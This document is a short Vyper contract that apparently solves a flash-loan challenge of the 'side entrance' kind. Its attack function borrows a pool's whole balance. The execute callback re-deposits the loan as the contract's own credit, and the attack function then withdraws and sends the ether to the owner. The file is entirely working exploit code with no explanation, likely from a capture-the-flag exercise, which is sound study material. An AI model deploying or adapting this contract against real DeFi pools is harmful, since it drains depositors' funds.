# @version ^0.3.7

interface IPool:
    def flashLoan(amount: uint256): nonpayable
    def withdraw(): nonpayable
    def deposit(): payable

owner: immutable(address)

pool: IPool

@external
@payable
def __init__(_pool: IPool):
    owner = msg.sender
    self.pool = _pool

@external
def attack():
    assert msg.sender == owner, "!owner"
    self.pool.flashLoan(self.pool.address.balance)
    self.pool.withdraw()
    send(msg.sender, self.balance)

@external
@payable
def execute():
    self.pool.deposit(value=msg.value)

@external
@payable
def __default__():
    pass
